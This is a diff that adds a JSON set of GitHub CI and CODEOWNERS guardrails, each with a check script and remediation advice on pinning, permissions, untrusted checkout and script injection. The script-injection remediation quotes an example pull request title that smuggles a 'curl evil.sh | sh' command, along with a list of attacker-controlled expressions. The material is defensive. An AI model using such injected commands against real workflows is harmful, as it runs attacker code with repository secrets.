@@ -1,0 +1,183 @@
+{
+  "version": "v1",
+  "category": "github",
+  "icon": "icon.svg",
+  "collect": [
+    "github"
+  ],
+  "inputs": {
+    "workflows": {
+      "default": ".github/workflows/*.yml,.github/workflows/*.yaml",
+      "description": "Comma separated globs naming the workflows to read."
+    }
+  },
+  "guardrails": {
+    "actions-pinned-by-digest": {
+      "name": "Workflow steps pin the code they run",
+      "description": "Every third-party action a workflow uses is pinned to a full commit sha, not to a tag or a branch.",
+      "severity": "error",
+      "remediation": "Replace the tag with the commit sha it points to today, and keep the tag next to it as a comment so people can still read the version:\n\n```yaml\n- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n```\n\nA tag is a moving pointer that the action's owner can repoint at any time. A workflow that trusts a tag runs whatever that account decides to publish, with your secrets in scope. `dependabot` and `renovate` both understand this form and will keep updating the sha for you.",
+      "check": {
+        "run": "actions-pinned-by-digest.py",
+        "timeoutSeconds": 30
+      },
+      "inputs": {
+        "allow": {
+          "default": "",
+          "description": "Comma separated action names exempt from pinning, such as the ones your own organisation publishes. Globs such as `actions/*` are supported."
+        }
+      },
+      "maxViolations": 0
+    },
+    "least-privilege-token": {
+      "name": "Workflows declare the token permissions they need",
+      "description": "Every workflow declares `permissions`, and none of them grants write access to everything.",
+      "severity": "error",
+      "remediation": "Declare the narrowest set of permissions the workflow actually needs, at the top of the file or on the job:\n\n```yaml\npermissions:\n  contents: read\n```\n\nA workflow that declares nothing inherits the repository default, which in many organisations is still write access to everything. That token is available to every step, including every third-party action the workflow runs, so this block decides how much damage a compromised action can do.",
+      "check": {
+        "run": "least-privilege-token.py",
+        "timeoutSeconds": 30
+      },
+      "inputs": {
+        "allowWriteAll": {
+          "default": "false",
+          "description": "Whether `permissions: write-all` is accepted. It rarely should be."
+        }
+      },
+      "maxViolations": 0
+    },
+    "no-untrusted-checkout": {
+      "name": "No privileged workflow runs untrusted code",
+      "description": "No workflow triggered by `pull_request_target`, `issue_comment` or `workflow_run` checks out a revision of its own choosing, or passes the request's revision into a command.",
+      "severity": "error",
+      "remediation": "Split the workflow. Do the untrusted work under `pull_request`, which runs without your secrets, and keep the privileged trigger for the step that needs the token, checking out only the base:\n\n```yaml\non: pull_request_target\njobs:\n  label:\n    steps:\n      - uses: actions/checkout@<sha>\n```\n\n`pull_request_target` runs with the repository's secrets and a writable token, using the workflow definition from the base branch. Checking out the pull request head under it hands both to whoever opened the pull request. It is the single most exploited CI misconfiguration there is.\n\nThe guardrail reads the input **names** a checkout step declares, not their values, so any `ref` under one of these triggers is flagged. Checking out the base explicitly is the rare legitimate case: give that step no `ref` at all, because under `pull_request_target` that already checks out the base.",
+      "check": {
+        "run": "no-untrusted-checkout.py",
+        "timeoutSeconds": 30
+      },
+      "maxViolations": 0
+    },
+    "job-timeout-set": {
+      "name": "Workflow jobs declare a timeout",
+      "description": "Every job declares how long it may run, so a hung job is stopped instead of holding a runner until GitHub's own limit.",
+      "severity": "info",
+      "remediation": "Set a timeout on each job:\n\n```yaml\njobs:\n  build:\n    timeout-minutes: 15\n```\n\nGitHub's default is six hours. A job that hangs holds a runner for all of that time, which on a self-hosted fleet means a queue nobody can clear, and on a hosted one means a bill.",
+      "check": {
+        "run": "job-timeout-set.py",
+        "timeoutSeconds": 30
+      },
+      "inputs": {
+        "maxMinutes": {
+          "default": "60",
+          "description": "Longest timeout accepted. A job that declares more than this is treated as declaring none."
+        }
+      },
+      "maxViolations": 0
+    },
+    "no-script-injection": {
+      "name": "No workflow interpolates untrusted text into a shell",
+      "description": "No `run` step interpolates a `${{ }}` expression an outsider controls, such as a pull request title or a branch name, straight into the shell body.",
+      "severity": "error",
+      "remediation": "Pass the value through an environment variable instead of writing it into the script, so the shell reads it as data and never parses it as code:\n\n```yaml\n- name: Greet\n  env:\n    TITLE: ${{ github.event.pull_request.title }}\n  run: echo \"$TITLE\"\n```\n\nThe interpolation happens **before** the shell runs, so `${{ github.event.pull_request.title }}` puts the attacker's text into the script itself. A pull request titled ``a\"; curl evil.sh | sh; #`` then runs on the runner with access to everything the job's token and secrets can reach. The environment variable form never reaches the parser. Quoting the expression in the script is not a fix, because the attacker chooses the quotes too.\n\nSee [GitHub's script injection guidance](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections).",
+      "check": {
+        "run": "no-script-injection.py",
+        "timeoutSeconds": 30
+      },
+      "inputs": {
+        "expressions": {
+          "default": "github.event.issue.title,github.event.issue.body,github.event.pull_request.title,github.event.pull_request.body,github.event.pull_request.head.ref,github.event.pull_request.head.label,github.event.pull_request.head.repo,github.event.comment.body,github.event.review.body,github.event.review_comment.body,github.event.discussion.title,github.event.discussion.body,github.event.commits,github.event.head_commit.message,github.event.head_commit.author,github.event.pages,github.event.workflow_run.head_branch,github.event.workflow_run.head_commit.message,github.head_ref",
+          "description": "Comma separated expression prefixes an outsider controls. Interpolating any of them inside a `run` body is a violation."
+        }
+      },
+      "maxViolations": 0
+    },
+    "codeowners-present": {
+      "name": "Repository declares its code owners",
+      "description": "The repository has a `CODEOWNERS` file where GitHub looks for one, with at least one rule, so every change has someone to review it.",
+      "severity": "warning",
+      "remediation": "Add a `CODEOWNERS` file under `.github/`, at the repository root or under `docs/`. These are the three places GitHub looks, in that order:\n\n```\n*               @company/platform\n/terraform/     @company/infrastructure\n/docs/          @company/docs\n```\n\nWithout one, GitHub has no reviewer to request on a pull request, so review falls to whoever happens to notice. An auditor asking who approved a change to production runs into the same problem.",
+      "check": {
+        "run": "codeowners-present.py",
+        "timeoutSeconds": 30
+      },
+      "maxViolations": 0
+    },
+    "codeowners-parses": {
+      "name": "Every CODEOWNERS line is a rule",
+      "description": "Every line of `CODEOWNERS` that is not a comment is a rule GitHub can read, so no ownership is silently lost to a line GitHub ignores.",
+      "severity": "error",
+      "remediation": "Fix the lines listed in the violations. A rule is a pattern, then whitespace, then the owners:\n\n```\n/api/   @company/backend @dana\n```\n\nAn owner is a GitHub user (`@dana`), a GitHub team (`@company/backend`) or an email address. GitHub ignores a line that doesn't fit this format without reporting it, so the paths it was meant to cover end up owned by whichever rule came before it.",
+      "check": {
+        "run": "codeowners-parses.py",
+        "timeoutSeconds": 30
+      },
+      "maxViolations": 0
+    },
+    "codeowners-catch-all": {
+      "name": "CODEOWNERS covers everything",
+      "description": "`CODEOWNERS` has a rule matching every path, so even a file nobody thought about has an owner.",
+      "severity": "warning",
+      "remediation": "Add a catch-all as the **first** rule, then add narrower rules below it:\n\n```\n*               @company/platform\n/terraform/     @company/infrastructure\n```\n\nGitHub resolves ownership by last match, so a catch-all at the top acts as the baseline that later rules override. Without one, a new directory nobody wrote a rule for has no owner, and nobody notices the gap until a change lands in it.",
+      "check": {
+        "run": "codeowners-catch-all.py",
+        "timeoutSeconds": 30
+      },
+      "inputs": {
+        "patterns": {
+          "default": "*,**,/*",
+          "description": "Comma separated patterns, any one of which counts as matching every path."
+        }
+      },
+      "maxViolations": 0
+    },
+    "codeowners-no-unowned-rules": {
+      "name": "No CODEOWNERS rule removes ownership",
+      "description": "No rule in `CODEOWNERS` has an empty list of owners, which would remove ownership from everything it matches.",
+      "severity": "error",
+      "remediation": "Give the rules listed in the violations an owner, or delete them:\n\n```\n/vendor/   @company/platform\n```\n\nA pattern with no owners after it is valid, and GitHub treats it as deliberate: it removes ownership from every path it matches, and because the last match wins, it overrides the catch-all above it. That is almost never what the line was meant to do. The result is a directory that looks owned until someone opens a pull request against it.\n\nBracketed lines are reported here too. GitHub CODEOWNERS has no section headers, so `[Documentation]` is not a heading. GitHub reads it as a pattern with no owners, and it removes ownership from every path it matches.",
+      "check": {
+        "run": "codeowners-no-unowned-rules.py",
+        "timeoutSeconds": 30
+      },
+      "maxViolations": 0
+    },
+    "codeowners-owners-per-rule": {
+      "name": "Each CODEOWNERS rule names a workable number of owners",
+      "description": "Every rule in `CODEOWNERS` names at least the minimum and at most the maximum number of owners, so review neither depends on one person nor becomes everybody's problem.",
+      "severity": "warning",
+      "remediation": "Adjust the rules listed in the violations. A single owner is a single point of failure: when they are on leave, nobody can review the path. A long list fails the other way, because GitHub requests a review from all of them and each one assumes someone else will pick it up.\n\nA GitHub team counts as one owner:\n\n```\n/api/   @company/backend\n```\n\nThis is usually the right answer, because team membership is then managed in the team instead of in this file.",
+      "check": {
+        "run": "codeowners-owners-per-rule.py",
+        "timeoutSeconds": 30
+      },
+      "inputs": {
+        "minOwners": {
+          "default": "1",
+          "description": "Fewest owners a rule may name. A rule naming none is left to `github/codeowners-no-unowned-rules`."
+        },
+        "maxOwners": {
+          "default": "5",
+          "description": "Most owners a rule may name. `0` means no limit."
+        }
+      },
+      "maxViolations": 0
+    },
+    "codeowners-team-owned": {
+      "name": "CODEOWNERS rules name teams",
+      "description": "Every rule in `CODEOWNERS` names at least one GitHub team, so ownership outlasts the people currently on it.",
+      "severity": "warning",
+      "remediation": "Replace the individuals listed in the violations with the team they belong to:\n\n```\n-/api/   @dana @sam\n+/api/   @company/backend\n```\n\nA rule naming individuals goes stale as soon as one of them changes team, and nothing warns you: GitHub keeps requesting reviews from someone who no longer works on that code. An `@org/team` owner moves membership out of this file, where changes are reviewed, and into the GitHub team, where membership is administered.",
+      "check": {
+        "run": "codeowners-team-owned.py",
+        "timeoutSeconds": 30
+      },
+      "inputs": {
+        "allowIndividuals": {
+          "default": "true",
+          "description": "Whether a rule naming individuals alongside a team is accepted. A team is required either way; this only decides whether the individuals next to it are reported as a separate finding."
+        }
+      },
+      "maxViolations": 0
+    }
+  }
+}
